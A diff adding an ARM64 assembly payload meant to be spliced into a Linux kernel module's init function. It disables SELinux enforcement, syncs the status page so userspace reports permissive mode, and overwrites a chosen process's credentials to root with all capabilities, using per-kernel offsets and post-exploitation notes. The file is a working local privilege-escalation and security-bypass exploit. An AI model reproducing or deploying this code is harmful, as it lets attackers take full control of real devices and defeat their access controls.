@@ -1,0 +1,70 @@
+// Merged enforcing=0 + cred-patch, spliced into a NOT-loaded carrier's init_module (e.g.
+// usbip-vudc, 408B .init.text). Relocation-free: the carrier's own init `bl __platform_driver_register`
+// (kept at the anchor slot, kernel-relocated) is decoded to pdr; find_vpid/pid_task/selinux_state are
+// pdr + per-kernel deltas (from vmlinux). Roots the task pid=<baked>. movz/movk immediates and the
+// anchor CALL26 offset are patched by the builder. Offsets: task->cred @0x778; cred uid@4..fsgid@32,
+// caps @40/48/56/64/72 (identical 5.10.240/246).
+.section .patch,"ax"
+.globl _start
+_start:
+    paciasp
+    stp x29, x30, [sp, #-64]!
+    stp x19, x20, [sp, #16]
+    stp x21, x22, [sp, #32]
+    mov x29, sp
+    // decode anchor bl -> pdr (x19)
+    adr x0, anchor
+    ldr w1, [x0]
+    sbfx x1, x1, #0, #26
+    add x19, x0, w1, sxtw #2
+    b   skip
+anchor:
+    bl  0                        // CALL26 -> __platform_driver_register (patched offset; never executed)
+skip:
+    // enforcing = 0 : selinux_state = pdr + DSEL
+    movz w1, #0                  // [P0] DSEL_lo
+    movk w1, #0, lsl #16         // [P1] DSEL_hi
+    add  x2, x19, w1, sxtw
+    strb wzr, [x2]
+    // sync SELinux status page so userspace libselinux sees permissive:
+    // selinux_status_update_setenforce(&selinux_state, 0) = pdr + DSSUSE
+    movz w3, #0                  // [P2] DSSUSE_lo
+    movk w3, #0, lsl #16         // [P3] DSSUSE_hi
+    add  x4, x19, w3, sxtw
+    mov  x0, x2                  // arg0 = &selinux_state
+    mov  x1, xzr                 // arg1 = enforcing = 0
+    blr  x4
+    // find_vpid = pdr + DFV (x20)
+    movz w1, #0                  // [P2] DFV_lo
+    movk w1, #0, lsl #16         // [P3] DFV_hi
+    add  x20, x19, w1, sxtw
+    // pid_task = pdr + DPT (x21)
+    movz w1, #0                  // [P4] DPT_lo
+    movk w1, #0, lsl #16         // [P5] DPT_hi
+    add  x21, x19, w1, sxtw
+    // find_vpid(pid)
+    movz w0, #0                  // [P6] PID_lo
+    movk w0, #0, lsl #16         // [P7] PID_hi
+    blr  x20
+    cbz  x0, done
+    // pid_task(pid_struct, PIDTYPE_PID=0)
+    mov  x1, #0
+    blr  x21
+    cbz  x0, done
+    // cred = task->cred ; patch to root
+    ldr  x2, [x0, #0x778]
+    stp  wzr, wzr, [x2, #4]      // uid, gid
+    stp  wzr, wzr, [x2, #12]     // suid, sgid
+    stp  wzr, wzr, [x2, #20]     // euid, egid
+    stp  wzr, wzr, [x2, #28]     // fsuid, fsgid
+    mov  x3, #-1
+    stp  x3, x3, [x2, #40]       // cap_inheritable, cap_permitted
+    stp  x3, x3, [x2, #56]       // cap_effective, cap_bset
+    str  x3, [x2, #72]           // cap_ambient
+done:
+    mov w0, wzr                  // return 0 (init success; module stays loaded, rmmod'd in postex)
+    ldp x21, x22, [sp, #32]
+    ldp x19, x20, [sp, #16]
+    ldp x29, x30, [sp], #64
+    autiasp
+    ret
